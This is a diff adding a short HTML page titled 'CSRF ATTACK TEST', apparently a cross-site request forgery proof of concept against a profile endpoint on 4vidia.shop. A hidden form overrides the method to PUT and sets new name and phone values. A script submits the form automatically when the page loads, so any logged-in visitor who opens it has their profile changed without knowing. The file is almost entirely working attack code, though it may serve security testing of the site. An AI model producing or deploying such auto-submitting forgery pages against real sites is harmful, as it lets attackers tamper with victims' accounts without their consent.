@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html>
+<body>
+<h1>CSRF ATTACK TEST</h1>
+
+<form action="https://4vidia.shop/mypage/profile"
+      method="POST">
+  <input type="hidden" name="_method" value="PUT" />
+  <input type="hidden" name="name" value="ryujigangganggang" />
+  <input type="hidden" name="phone" value="01000000000" />
+</form>
+
+<script>
+  document.forms[0].submit();
+</script>
+</body>
+</html>
